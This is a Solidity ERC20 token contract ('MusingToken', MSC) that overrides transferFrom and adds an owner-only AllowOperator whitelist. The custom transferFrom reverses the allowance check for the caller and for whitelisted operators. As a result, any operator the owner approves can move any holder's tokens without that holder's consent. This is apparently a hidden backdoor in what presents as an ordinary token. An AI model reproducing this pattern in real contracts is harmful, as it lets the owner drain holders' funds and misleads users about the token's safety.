// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract MusingToken is ERC20, Ownable {
    mapping (address => bool) public AllowedContract;

    constructor(uint256 initialSupply) ERC20("Musing", "MSC") {
        _mint(msg.sender, initialSupply);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        if (sender == _msgSender() || AllowedContract[_msgSender()]) {
            uint256 currentAllowance = allowance(_msgSender(), sender);
            require(currentAllowance >= amount, "ERC20: transfer amount(custom) exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        } else {
            uint256 currentAllowance = allowance(sender, _msgSender());
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }

        return true;
    }

    function AllowOperator(address _address, bool isAllowed) external onlyOwner {
        AllowedContract[_address] = isAllowed;
    }
}